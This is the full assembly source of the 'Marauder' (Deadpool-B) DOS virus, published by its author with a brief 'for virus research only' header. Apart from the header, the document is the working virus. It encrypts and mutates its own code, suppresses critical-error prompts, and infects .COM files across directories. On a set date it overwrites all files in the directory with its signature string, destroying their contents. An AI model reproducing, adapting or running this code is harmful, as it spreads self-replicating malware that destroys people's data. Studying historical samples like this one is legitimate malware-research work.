; "Marauder" Virus
; AKA Deadpool-B
;
; By Hellraiser
; Of Phalcon/Skism
;
; For virus reseach only
;
; I always wanted to release this source, so here it is.  Now that it's been caught
; take a look at whats inside.
;
; I know it's no great thing, but it's good to learn from.  It contains basic 
; encryption, mutation, and INT 24 handling.
;
; I will be very upset if I see 100 new versions of this code with some lame kids 
; name in place of mine.  So just use it to learn from, it's very straight foward.



code          segment 'code'
assume        cs:code, ds:code, ss:code, es:code
org           0100h

dta           EQU     endcode + 10
headlength    EQU     headend - headstart
bodylength    EQU     bodyend - bodystart
encryptpart   EQU     bodyend - mixed_up
part1size     EQU     part2 - part1
part2size     EQU     parta - part2
partasize     EQU     partb - parta
partbsize     EQU     dude - partb
mutants       EQU     chris - part1
total_mutant  EQU     mutants / 2
encryptlength EQU     encryptpart / 2
virus_size    EQU     headlength + bodylength + 5 ; head + body + int24 + 2
drive         EQU     endcode + 110
backslash     EQU     endcode + 111
orig_path     EQU     endcode + 113
dirdta        EQU     orig_path + 66
myid          EQU     88h
toolarge      EQU     65535 - virus_size
fileattr      EQU     21
filetime      EQU     22
filedate      EQU     24
filename      EQU     30

headstart:

              jmp    bodystart
              db     myid
headend:

realprogramstart:
              db     90h, 90h, 90h               
              db     0cdh, 020h, 1ah, 1ah      
realprogramend:

bodystart:
              call    deadpool
deadpool:
              pop     si                         
              sub     si,offset deadpool        
              call    encrypt
              jmp     chris

enc_code      dw      0000h                     

encrypt       proc    near
assume        cs:code, ds:code, es:code, ss:code

part1_:
              push    ax                       
              push    bx                        
              push    cx                        
              push    dx                       
              mov     cx, encryptlength         
              mov     bp, si                    
              add     si, offset bodyend        
              mov     di,si                      
              std                            
xor_loop:
              lodsw                             
              xor     ax, [bp + enc_code]        
              stosw                              
              loop    xor_loop
done_:
              mov     si, bp                   
              pop     dx                        
              pop     cx                        
              pop     bx                         
              pop     ax                         

              ret
             ;nop

encrypt       endp


infect        proc    near

              call    encrypt                   
              int     21h                     
              call    encrypt                   
              ret

infect        endp


mixed_up:



part1:
              push    dx
              push    cx
              push    bx
              push    ax
              mov     cx, encryptlength
              mov     bp, si
              add     si, offset mixed_up
              mov     di,si
              cld

part2:
              mov     si, bp
              pop     ax
              pop     bx
              pop     cx
              pop     dx



parta:
              mov     bp, si
              add     si, offset endcode
              mov     di, si
              push    ax
              push    bx
              push    cx
              push    dx
              mov     cx, encryptlength
              std

partb:
              pop     dx
              pop     cx
              pop     bx
              pop     ax
              mov     si, bp


dude:

; don't get any ideas lamer

hellraiser    label   byte
idbuffer      db      0cdh, 20h,' [Marauder] 1992 Hellraiser - Phalcon/Skism. '
stringsize    EQU     ($ - hellraiser)

chris:

              push    es
              mov     ax,3524h                 
              int     21h                       
              mov     [si + word ptr oint24], bx
              mov     [si + word ptr oint24 + 2], es
              pop     es

              mov     ax, 2524h                 
              lea     dx, [si + newint24] 
              int     21h                       

              push    si                       
              mov     ah, 47h                    
              xor     dl,dl                     
              add     si, offset orig_path      
              int     21h                      

              pop     si                         
              mov     ah,19h                    
              int     21h                       

              add     al, 41h                   
              mov     byte ptr [si + offset drive], al

              mov     ax, '\:'                 
              mov     word ptr [si + offset backslash], ax

              ;mov     byte ptr [si + offset defaultdrive], al 


; here's my new tri-dimensional jmp displacement theory in play

              push    si                        
              pop     bp                       

              lea     si, [bp + offset oldjmp]   
              lea     di, [bp + offset thisjmp]
              mov     cx,04h                    
              cld                                
              rep     movsb                   

              push    bp                        
              pop     si                       
why:

              mov     ah,1ah                    
              lea     dx,[si + dta]            
              int     21h                     

              mov     ah,2ah                  
              int     21h                      

              cmp     dx, 0202h                  
              jne     ff                        
              jmp     smash                      

ff:
              mov     ah,4eh                  
              lea     dx,[si + filespec]         
              mov     cx, 07h                    

searchloop:

              int     21h                        
              jnc     here                      
              ;jmp    up



              mov      ah,1ah
              lea      dx,[si + dirdta]         
              int      21h                       

              mov      ah,3bh                    
              lea      dx,[si + offset rootdir]  
              int      21h                       
              jc       at_root                   
              jmp      why                       

at_root:
              cmp      byte ptr [si + donebefore], 01h
              je       notokey                  
                                                
              mov      al,01h                   
              mov      [si + donebefore], al     

              mov      ah,4eh                  
              xor      cx,cx                     
              mov      cl,13h                   
                                                 

              lea      dx, [si + dwildcards]     
ffdloop:

              int      21h                       
              jnc      okey                     
              jmp      far ptr nofilesfound     

notokey:
              mov      ah,4fh                    
              jmp      ffdloop                   

okey:
              mov      ah,3bh                     
              lea      dx, [si + offset dirdta + filename]
              int      21h                       
              jc       notokey                  
              jmp      why                        


here:

              mov     bx, word ptr [si + offset dta + fileattr]
              mov     word ptr [si + origattr], bx

              mov     ax,4301h                   
              xor     cx,cx
              lea     dx, [si + offset dta + filename]
              int     21h
              jc      bad_file2

              call    openfile
              jc      bad_file2                  

              mov     word ptr [si + offset handle], ax

              mov     bx, word ptr [si + offset dta + filedate]
              mov     word ptr [si + origdate], bx
              mov     bx, word ptr [si + offset dta + filetime]
              mov     word ptr [si + origtime], bx

              xchg    bx, ax                     

              mov     ah, 3fh                   
              mov     cx, 4
              lea     dx, [si + oldjmp]         
              int     21h                        

              cmp     byte ptr [si + offset oldjmp + 3], myid
              jne     sick_of_it_all             
              
bad_file:
              mov     ax,4301h                   
              mov     cx, word ptr [si + offset origattr]
              lea     dx, [si + offset dta + filename]
              xor     ch,ch
              int     21h

              mov     ah,3eh                    
              int     21h                       

bad_file2:
              cmp     ax, 05h                   
              je      dumb                       
              cmp     ax, 02h                    
              je      dumb                      
              mov     ah, 4fh                    
              jmp     searchloop                
dumb:
              jmp     nofilesfound             

sick_of_it_all:

              cmp     word ptr [si + offset oldjmp], 5a4dh  
              je      bad_file                 

              call    seekeof

              cmp     ax,0010h                  
              jb      bad_file                   
              cmp     ax, toolarge             
              jae     bad_file                   


              sub     ax,03h                     
              mov     [si + newjmp + 2], ah  
              mov     [si + newjmp+ 1], al       
              mov     [si + newjmp + 3], myid    
              mov     ah, 0e9h                  
              mov     [si + newjmp], ah          

              xor     al,al                    
              mov     [si + donebefore], al     

              inc     word ptr [si + generation] 

              mov      bp, si                    
              call     enc_enc                   

tryagain:
              mov      ah,2ch                  
              int      21h                       
              cmp      dx, 0000h               
              je       tryagain                 
              mov      word ptr [si + offset enc_code], dx
                                                

              mov     cl, 8                      
              ror     dx, cl                     
              mov     word  ptr [si + offset mutantcode], dx

              cmp     dl, 30                    
              jng     encrypt_a                
              jmp     encrypt_b                  


encrypt_a:
             ;mov     bp, si                    

              lea     si,[bp + offset part1]     
              lea     di,[bp + offset part1_]   
              mov     cx, part1size             
              call    dostring                 
              lea     si,[bp + offset part2]     
              lea     di,[bp + offset done_]     

              mov     cx, part2size              
              call    dostring

              jmp     attach                    

encrypt_b:

              lea     si,[bp + offset parta]     
              lea     di,[bp + offset part1_]   
              mov     cx, part1size            
              call    dostring                   

              lea     si,[bp + offset partb]     
              lea     di,[bp + offset done_]     
              mov     cx, part2size              
              call    dostring                  

attach:
              call    enc_enc                   

              mov     si,bp
              mov     ah,40h                    
              mov     cx, bodyend - bodystart    
              add     cx, 5
              lea     dx,[si + bodystart]        
              call    infect                     
              jc      close_file               
                                                 

              call    seektof

              mov     ah,40h                     
              mov     cx, 4                      
              lea     dx,[si + offset newjmp]    
              int     21h                        

close_file:

              
              mov     ax,5701h                   
              mov     cx, word ptr [si + offset origtime]
              mov     dx, word ptr [si + offset origdate]
              mov     bx, word ptr [si + offset handle]
              int     21h

              mov     ah, 3eh                   
              int     21h

              mov     ax,4301h                  
              mov     cx, word ptr [si + offset origattr]
              lea     dx, [si + offset dta + filename]
              xor     ch,ch
              int     21h


nofilesfound:

              mov     ah, 03bh                   
              lea     dx, [si + offset drive]    
              int     21h                       

restoredta:
              mov     ah, 1ah                    
              mov     dx, 080h                  
              int     21h

              push    si                        
              pop     bp                        

              mov     ax, 2524h                  
              lea     dx, [si + oint24]         
              int     21h                       

              lea     si,[bp + offset thisjmp]   
              mov     di,100h                   

              mov     cx,04h                     
              cld                               
              rep     movsb                    

              mov     di, 0100h                  
              jmp     di                         

smash         proc    near

              call    enc_enc                    
              mov     ah, 4eh                    
              mov     cx, 07h                   
              lea     dx, [si + offset dwildcards] ;

r_loop:
              int     21h                       
              jc      restoredta                 

              call    kill                      

              mov     ah, 4fh                 
              jmp     r_loop

smash         endp

dostring      proc    near

              cld                                
              rep     movsb                     
              ret                              

dostring      endp


enc_enc       proc    near

              mov     si, bp                     
              add     si, offset part1           
              mov     di, si                   
              mov     cx, total_mutant          

loop_xor:
              lodsw                              
              xor     ax, [bp + mutantcode] ;
              stosw                              
              loop    loop_xor

              mov     si, bp
              ret

enc_enc       endp

seektof       proc    near

              mov     ax,4200h
              xor     cx,cx                    
              xor     dx,dx                  
              int     21h                       

              ret

seektof       endp


seekeof       proc    near

              mov    ax,4202h                  
              xor    dx,dx
              xor    cx,cx
              int    21h

              ret

seekeof       endp


openfile      proc    near

              mov    ax,3d02h                    
              lea    dx, [si + offset dta + filename]
              int    21h                         

              ret

openfile      endp

kill          proc   near

              call   openfile                    
              jc     return
              mov    bx, ax                       

              push   bx                           

              call   seekeof                      

              mov    bx, stringsize             
              div    bx                           
              mov    cx, ax                    
              pop    bx                          
              push   cx                           

              call   seektof                     
              pop    cx


loop_:
              push   cx                           
              mov    ah, 40h                      
              mov    cx, stringsize               
              lea    dx, [si + offset idbuffer]  
              int    21h
              jc     ender
              pop    cx
              dec    cx
              jcxz   ender
              jmp    loop_
ender:

              mov    ah, 3eh                     
              int    21h                       

return:
              ret

kill          endp


filespec      db      '*.COM',0                  
dwildcards    db      '*.*',0                  
rootdir       db      '..',0                     
generation    dw      0000                       
origdate      dw      ?                         
origtime      dw      ?                          
origattr      db      ?                          
handle        dw      ?                          
defaultdrive  db      ?                          
oldjmp        db      09h, 0cdh, 020h, 90h       
thisjmp       db      4 dup (?)                  
newjmp        db      4 dup (?)                  
mutantcode    dw      0000                       
donebefore    db      00                         
oint24        dd      00                         

bodyend:

; not encrypted

newint24:
              xor     al,al                     
              iret                               
endcode:

code          ends
              end    headstart


